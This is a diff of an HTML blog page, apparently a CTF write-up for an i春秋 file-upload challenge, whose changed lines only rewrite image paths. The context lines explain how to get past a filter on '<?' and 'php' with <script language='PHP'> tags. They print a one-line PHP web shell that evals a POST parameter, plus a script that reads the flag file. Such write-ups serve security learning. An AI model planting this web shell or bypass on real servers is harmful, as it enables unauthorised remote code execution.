@@ -86,13 +86,9 @@
 <p>发现**&lt;?<strong>和<strong>php</strong>被过滤了，看了wp后知道，可以用**&lt;script language=”PHP”&gt;&lt;/script&gt;<strong>绕过</strong>&lt;?<strong>、用函数</strong>strtolower(“PHP”)<strong>绕过过滤的</strong>php</strong>。如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一句话木马：</span></span><br><span class="line">&lt;script language=<span class="string">&quot;PHP&quot;</span>&gt;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//读取flag文件并显示出来</span></span><br><span class="line">&lt;script language=<span class="string">&quot;PHP&quot;</span>&gt;</span><br><span class="line"><span class="variable">$fh</span>=fopen(<span class="string">&#x27;../flag.&#x27;</span>.strtolower(<span class="string">&#x27;PHP&#x27;</span>),<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> fread(<span class="variable">$fh</span>,filesize(<span class="string">&#x27;../flag.&#x27;</span>.strtolower(<span class="string">&#x27;PHP&#x27;</span>)));</span><br><span class="line">fclose(<span class="variable">$fh</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="../images/ichunqiu-web/Web_Upload-1.png" alt="Web_Upload-1" style="zoom:50%;">
+<img src="/2021/07/12/ichunqiu-web/ichunqiu-web/Web_Upload-1.png" alt="Web_Upload-1" style="zoom:50%;">
 
-<img src="../images/ichunqiu-web/Web_Upload-2.png" alt="Web_Upload-2" style="zoom:50%;">
-
-
-
-
+<img src="/2021/07/12/ichunqiu-web/ichunqiu-web/Web_Upload-2.png" alt="Web_Upload-2" style="zoom:50%;">
 
 
 
